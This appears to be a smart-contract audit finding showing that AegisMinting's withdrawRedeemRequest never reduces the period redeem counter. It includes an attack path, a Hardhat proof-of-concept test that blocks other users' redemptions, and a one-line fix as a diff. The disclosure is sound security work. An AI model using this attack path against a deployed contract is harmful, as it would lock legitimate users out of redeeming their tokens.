# Attacker can prevent others from making a redeem request forever

### Summary

The attacker can call the [redeemRequest()](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/main/aegis-contracts/contracts/AegisMinting.sol#L277) with the maximum amount of yusd to make the [redeemLimit.currentPeriodTotalAmount == redeemLimit.maxPeriodAmount](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/main/aegis-contracts/contracts/AegisMinting.sol#L802) and then call the [withdrawRedeemRequest](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/main/aegis-contracts/contracts/AegisMinting.sol#L377) to withdraw his whole yusd to himself. This means users have to wait until the next period to make a redeem request, but then the attacker can repeat this action, making everyone wait indefinitely.

### Root Cause

Since users can request redemption, and then withdraw their redemption request immediately with no loss of token, in [withdrawRedeemRequest](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/main/aegis-contracts/contracts/AegisMinting.sol#L377), not subtracting the `yusdAmount` from `redeemLimit.currentPeriodTotalAmount` is a mistake and leads to preventing others from redeem requests because the redeem limit is reached.

### Internal Pre-conditions

1. The attacker needs to have `yusd`
2. The attacker needs to put in an amount of `yusd` to reach the redeem limit.
3. Admin needs to set the `redeemLimit.maxPeriodAmount` and `redeemLimit.periodDuration`

### External Pre-conditions

1. The attacker needs to be whitelisted to be able to call the `redeemRequest()` function

### Attack Path

1. Admin sets the `redeemLimit.maxPeriodAmount == 15e18` and `redeemLimit.periodDuration == 7 days`, and whitelists Alice.
2. Alice mints and receives 15e18 yusd, then calls the `redeemRequest()` with the maximum amount of yusd and locks it to reach the redeem limit.
3. Alice is then able to withdraw the redeem request and unlock the entire yusds. In this process, Alice doesn't lose any tokens.
4. Other whitelisted users cannot make a redeem request because the redeem limit is reached, but in reality, there is no locked yusd in the contract. They must wait 7 days for the next period to begin, but Alice can repeat the same actions and eventually prevent everyone from redeeming.

### Impact

The Whitelisted users can't request a redemption because a third-party person prevents them.

### PoC

Put this test in the `6_aegis_minting_redeem.spec.ts` file:
```ts
      it('should prevent others from making a redeem request', async () => {
        const [owner, sender] = await ethers.getSigners()

        const { aegisMintingContract, aegisMintingAddress, assetContract, assetAddress, yusdContract, aegisConfig } = await loadFixture(deployFixture)

        await aegisConfig['whitelistAddress(address,bool)'](sender, true)

        // Set limits
        const redeemMaxAmount = ethers.parseEther('15')
        await aegisMintingContract.grantRole(SETTINGS_MANAGER_ROLE, owner)
        // 604800 == 7 days
        await aegisMintingContract.setRedeemLimits(604800, redeemMaxAmount)

        await yusdContract.setMinter(owner)
        // mint yusd for the sender to request redeem
        await yusdContract.mint(sender, redeemMaxAmount)
        await yusdContract.setMinter(aegisMintingAddress)
        // Approve YUSD to be sent by the AegisMinting contract from the sender
        await yusdContract.connect(sender).approve(aegisMintingAddress, ethers.parseEther('1000'))

        const requestId = 'test'
        const yusdAmount = redeemMaxAmount
        let blockTime = await time.latest()
        const redeemOrder = {
          orderType: OrderType.REDEEM,
          userWallet: sender.address,
          collateralAsset: assetAddress,
          collateralAmount: ethers.parseEther('20'),
          yusdAmount: yusdAmount,
          slippageAdjustedAmount: yusdAmount,
          // We set the expiry to this to be able to call withdraw immediately
          expiry: blockTime + 1,
          nonce: Date.now(),
          additionalData: encodeString(requestId),
        }
        const signature = await signOrder(redeemOrder, aegisMintingAddress)

        await expect(aegisMintingContract.connect(sender).requestRedeem(redeemOrder, signature)).to.be.not.reverted

        const redeemLimit = await aegisMintingContract.redeemLimit()
        // redeem request limit reached
        expect(redeemLimit.currentPeriodTotalAmount).to.be.equal(redeemLimit.maxPeriodAmount)

        const benefactorYUSDBalanceBefore = await yusdContract.balanceOf(sender)

        await expect(aegisMintingContract.withdrawRedeemRequest(requestId)).to.be.not.reverted

        await expect(assetContract.balanceOf(aegisMintingAddress)).to.be.eventually.equal(0)
        await expect(yusdContract.balanceOf(sender)).to.be.eventually.equal(benefactorYUSDBalanceBefore + yusdAmount)

        // we used the same redeem order for simplicity
        await expect(aegisMintingContract.connect(owner).requestRedeem(redeemOrder, signature)).to.be.revertedWithCustomError(aegisMintingContract, 'LimitReached')
      })
```

### Mitigation

When the `AegisMinting` contract unlocks `yusd`, the `redeemLimit.currentPeriodTotalAmount` must be accounted for 
```diff
  function withdrawRedeemRequest(string calldata requestId) public nonReentrant whenRedeemUnpaused {
    
    // ...

    // Unlock YUSD
    totalRedeemLockedYUSD -= request.order.yusdAmount;
+    redeemLimit.currentPeriodTotalAmount -= request.order.yusdAmount;
    yusd.safeTransfer(request.order.userWallet, request.order.yusdAmount);

    emit WithdrawRedeemRequest(requestId, request.order.userWallet, request.order.yusdAmount);
  }
```
